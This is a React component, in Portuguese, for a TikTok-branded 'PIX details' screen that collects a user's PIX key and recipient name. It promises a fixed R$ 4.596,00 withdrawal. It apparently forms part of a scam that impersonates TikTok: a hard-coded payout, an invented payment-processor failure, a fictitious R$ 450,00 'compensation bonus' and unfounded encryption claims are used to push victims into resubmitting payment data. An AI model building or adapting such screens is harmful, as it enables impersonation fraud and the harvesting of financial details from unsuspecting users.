import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ShieldCheck, ChevronRight, Smartphone, AlertCircle, QrCode } from "lucide-react";
import TikTokHeader from "./TikTokHeader";

interface BankDetailsScreenProps {
  userName: string;
  onSubmit: (method: string, details: Record<string, string>) => void;
  isReverification?: boolean;
}

const PIX_KEY_TYPES = [
  { id: "cpf", label: "CPF" },
  { id: "cnpj", label: "CNPJ" },
  { id: "email", label: "E-mail" },
  { id: "phone", label: "Telefone" },
  { id: "random", label: "Chave Aleatória" },
];

type Step = "form" | "confirm";

const formatBRL = (value: number) =>
  value.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 });

const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: BankDetailsScreenProps) => {
  const [step, setStep] = useState<Step>("form");
  const [keyType, setKeyType] = useState("cpf");
  const [pixKey, setPixKey] = useState("");
  const [recipientName, setRecipientName] = useState("");
  const [submitting, setSubmitting] = useState(false);

  const selectedKeyType = PIX_KEY_TYPES.find((t) => t.id === keyType);

  const isFormValid = () => {
    return pixKey.trim().length > 2 && recipientName.trim().length > 1;
  };

  const details = { keyType: selectedKeyType?.label ?? keyType, pixKey, recipientName };

  const handleConfirm = async () => {
    setSubmitting(true);
    await onSubmit("pix", { keyType: selectedKeyType?.label ?? keyType, pixKey, recipientName });
    setSubmitting(false);
  };

  // --- CONFIRMATION ---
  if (step === "confirm") {
    return (
      <div className="min-h-screen flex flex-col bg-background">
        <TikTokHeader showHelp />
        <div className="flex-1 px-6 py-6">
          <div className="mt-4 mb-2 flex items-center justify-between">
            <h2 className="text-xl font-semibold">Confirme seus dados</h2>
            <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
              Passo 3 de 4
            </span>
          </div>
          <p className="text-sm text-muted-foreground mb-6">
            Revise as informações do seu PIX antes de enviar.
          </p>

          <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
            <div>
              <p className="text-xs text-muted-foreground">Método</p>
              <p className="text-sm font-medium">PIX</p>
            </div>
            <div>
              <div className="h-px bg-border" />
              <div className="pt-4">
                <p className="text-xs text-muted-foreground">Tipo de chave</p>
                <p className="text-sm font-medium">{details.keyType}</p>
              </div>
            </div>
            <div>
              <div className="h-px bg-border" />
              <div className="pt-4">
                <p className="text-xs text-muted-foreground">Chave PIX</p>
                <p className="text-sm font-medium">{details.pixKey}</p>
              </div>
            </div>
            <div>
              <div className="h-px bg-border" />
              <div className="pt-4">
                <p className="text-xs text-muted-foreground">Nome do recebedor</p>
                <p className="text-sm font-medium">{details.recipientName}</p>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mt-5">
            <ShieldCheck className="w-4 h-4 text-success shrink-0" />
            <p className="text-xs text-muted-foreground">
              Seus dados estão <strong className="text-foreground">criptografados</strong> e protegidos.
            </p>
          </div>

          <Button onClick={handleConfirm} disabled={submitting} className="w-full h-14 rounded-full text-base font-semibold mt-8">
            {submitting ? (
              <span className="flex items-center gap-2">
                <span className="w-4 h-4 border-2 border-primary-foreground/40 border-t-primary-foreground rounded-full animate-spin" />
                Processando...
              </span>
            ) : (
              "Confirmar e Continuar"
            )}
          </Button>
          <Button variant="ghost" onClick={() => setStep("form")} className="w-full mt-3 text-sm text-muted-foreground">
            ← Voltar e editar
          </Button>
        </div>
      </div>
    );
  }

  // --- FORM ---
  return (
    <div className="min-h-screen flex flex-col bg-background">
      <TikTokHeader showHelp />
      <div className="flex-1 px-6 py-6">
        <p className="text-sm text-muted-foreground mb-1">
          Bem-vindo de volta, <strong className="text-foreground">{userName}!</strong>
        </p>
        <div className="mt-4 mb-2 flex items-center justify-between">
          <h2 className="text-xl font-semibold">Dados do PIX</h2>
          <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
            Passo 3 de 4
          </span>
        </div>
        <p className="text-sm text-muted-foreground mb-4">
          Informe sua chave PIX para receber o saque de <strong className="text-foreground">R$ 4.596,00</strong>.
        </p>

        {isReverification && (
          <div className="space-y-3 mb-5">
            <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-destructive/5 border border-destructive/20">
              <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
              <div>
                <p className="text-xs font-semibold text-destructive">Falha na verificação PIX</p>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Sua chave PIX anterior não pôde ser verificada pelo nosso processador de pagamentos. Isso pode acontecer quando a chave está incorreta ou a conta possui restrições para receber transferências.
                </p>
              </div>
            </div>
            <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-secondary border border-border">
              <ShieldCheck className="w-4 h-4 text-primary shrink-0 mt-0.5" />
              <div>
                <p className="text-xs font-semibold">Por que preciso informar novamente?</p>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Para proteger seus fundos, nosso processador de pagamentos exige informações de saque precisas. Por favor, verifique sua chave PIX e o nome do recebedor antes de enviar. Seu bônus de compensação de R$ 450,00 já foi creditado ao seu saldo.
                </p>
              </div>
            </div>
          </div>
        )}

        <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
          <ShieldCheck className="w-4 h-4 text-success shrink-0" />
          <p className="text-xs text-muted-foreground">
            Seus dados estão <strong className="text-foreground">criptografados</strong> e armazenados com segurança.
          </p>
        </div>

        <div className="space-y-4">
          <div>
            <label className="text-sm font-medium mb-1.5 block">Tipo de chave PIX</label>
            <div className="grid grid-cols-3 gap-2">
              {PIX_KEY_TYPES.map((t) => (
                <button
                  key={t.id}
                  onClick={() => setKeyType(t.id)}
                  className={`h-11 rounded-xl text-sm font-medium transition-all ${
                    keyType === t.id
                      ? "bg-foreground text-primary-foreground"
                      : "bg-secondary text-muted-foreground hover:bg-accent"
                  }`}
                >
                  {t.label}
                </button>
              ))}
            </div>
          </div>

          <div>
            <label className="text-sm font-medium mb-1.5 block">Chave PIX</label>
            <div className="relative">
              <QrCode className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <Input
                type="text"
                placeholder={
                  keyType === "cpf" ? "000.000.000-00" :
                  keyType === "cnpj" ? "00.000.000/0000-00" :
                  keyType === "email" ? "seu@email.com" :
                  keyType === "phone" ? "+55 (00) 00000-0000" :
                  "Chave aleatória"
                }
                value={pixKey}
                onChange={(e) => setPixKey(e.target.value)}
                className="h-12 rounded-xl pl-11"
              />
            </div>
          </div>

          <div>
            <label className="text-sm font-medium mb-1.5 block">Nome do recebedor</label>
            <Input
              type="text"
              placeholder="Nome completo do titular"
              value={recipientName}
              onChange={(e) => setRecipientName(e.target.value)}
              className="h-12 rounded-xl"
            />
          </div>
        </div>

        <Button
          onClick={() => setStep("confirm")}
          disabled={!isFormValid()}
          className="w-full h-14 rounded-full text-base font-semibold mt-8"
        >
          Continuar
        </Button>
      </div>
    </div>
  );
};

export default BankDetailsScreen;
